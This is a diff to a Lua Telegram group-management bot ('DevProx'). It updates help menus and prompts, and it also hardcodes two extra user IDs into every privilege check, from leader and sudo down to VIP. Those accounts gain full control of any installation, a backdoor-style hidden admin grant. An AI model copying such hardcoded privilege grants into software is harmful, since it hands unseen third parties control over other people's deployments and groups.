@@ -117,12 +117,16 @@ function is_leader(msg)
 local var = false 
 if msg.sender_user_id_ == tonumber(DevId) then var = true end 
 if msg.sender_user_id_ == tonumber(218385683) then var = true end 
+if msg.sender_user_id_ == tonumber(556748924) then var = true end 
+if msg.sender_user_id_ == tonumber(650133965) then var = true end 
 return var end 
 
 function is_leaderid(user_id)
 local var = false
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ----------  Sudo  ----------
@@ -134,6 +138,8 @@ var = true
 end end
 if msg.sender_user_id_ == tonumber(DevId) then var = true end
 if msg.sender_user_id_ == tonumber(218385683) then var = true end 
+if msg.sender_user_id_ == tonumber(556748924) then var = true end 
+if msg.sender_user_id_ == tonumber(650133965) then var = true end 
 return var end
 
 function is_sudoid(user_id)
@@ -144,6 +150,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ----------  SudoBot  ---------
@@ -158,6 +166,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ----------Owner all---------
@@ -174,6 +184,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ----------admin all---------
@@ -192,6 +204,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ------ VIP MEMBER ALL ------
@@ -212,6 +226,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ----------  donky  ---------
@@ -238,6 +254,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ----------  monsh  ---------
@@ -254,6 +272,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ---------  monshid  ---------
@@ -272,6 +292,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ----------  Owner  ---------
@@ -292,6 +314,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ----------  admin  ---------
@@ -316,6 +340,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 ---------VIP MEMBER---------
@@ -344,6 +370,8 @@ var = true
 end end
 if user_id == tonumber(DevId) then var = true end
 if user_id == tonumber(218385683) then var = true end 
+if user_id == tonumber(556748924) then var = true end 
+if user_id == tonumber(650133965) then var = true end 
 return var end
 --     Source DevProx     --
 local setnumbergp = function()
@@ -9171,7 +9199,7 @@ return false    end
 if msg.content_.text_ then
 local content_DevAbs2 = DevAbs:get(DevProx.."add:repallt"..msg.sender_user_id_)
 if content_DevAbs2 == 'set_rep' then
-Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسڵ ڵي ٱڵرد سوٱء كٱن ↫ ⤈\n❨ ملصق • متحركه • صوره • فيديو\n • بصمه • صوت • رساله ❩\n ✓" ,  1, "md")
+Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسڵ ڵي ٱڵرد سوٱء كٱن ↫ ⤈\n❨ ملصق • متحركه • صوره • فيديو\n • بصمه • صوت • رساله ❩\n☬︙ڵڵخروج ٱرسڵ ↫ ( الغاء )\n ✓" ,  1, "md")
 DevAbs:set(DevProx.."add:repallt"..msg.sender_user_id_,'save_rep')
 DevAbs:set(DevProx.."addreply2:"..msg.sender_user_id_, msg.content_.text_)
 DevAbs:sadd(DevProx.."rep_sudo",msg.content_.text_)
@@ -9203,7 +9231,7 @@ return false    end
 if msg.content_.text_ then
 local content_DevAbs2 = DevAbs:get(DevProx.."add:repmusic"..msg.sender_user_id_)
 if content_DevAbs2 == 'set_repmusic' then
-Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسڵ ٱلٱغنيه سوٱء كٱنت ↫ ⤈\n❨ بصمه • فيديو • صوت ❩\n ✓" ,  1, "md")
+Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسڵ ٱلٱغنيه سوٱء كٱنت ↫ ⤈\n❨ بصمه • فيديو • صوت ❩\n☬︙ڵڵخروج ٱرسڵ ↫ ( الغاء )\n ✓" ,  1, "md")
 DevAbs:set(DevProx.."add:repmusic"..msg.sender_user_id_,'save_repmusic')
 DevAbs:set(DevProx.."addreply3:"..msg.sender_user_id_, msg.content_.text_)
 DevAbs:sadd(DevProx.."repmusic_sudo",msg.content_.text_)
@@ -9612,7 +9640,8 @@ local text =  [[
 ☬︙اوامر اخرى ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
 ☬︙كول + الكلمه
-☬︙طقس + اسم المدينه
+☬︙بحث + اسم الاغنيه
+☬︙تحميل + رابط الاغنيه
 ☬︙بوسه • بوسها ↫ بالرد
 ☬︙هينه ↫ بالرد بالمعرف
 ☬︙الرتبه ↫ بالرد بالمعرف
@@ -9741,6 +9770,8 @@ local text =  [[
 ☬︙تفعيل • تعطيل ↫ الرابط
 ☬︙تفعيل • تعطيل ↫ ضافني
 ☬︙تفعيل • تعطيل ↫ اطردني
+☬︙تفعيل • تعطيل ↫ الترحيب
+☬︙تفعيل • تعطيل ↫ اليوتيوب
 ☬︙تفعيل • تعطيل ↫ ردود المطور
 ☬︙تفعيل • تعطيل ↫ جلب الصوره
 ☬︙تفعيل • تعطيل ↫ تنبيه التغيرات
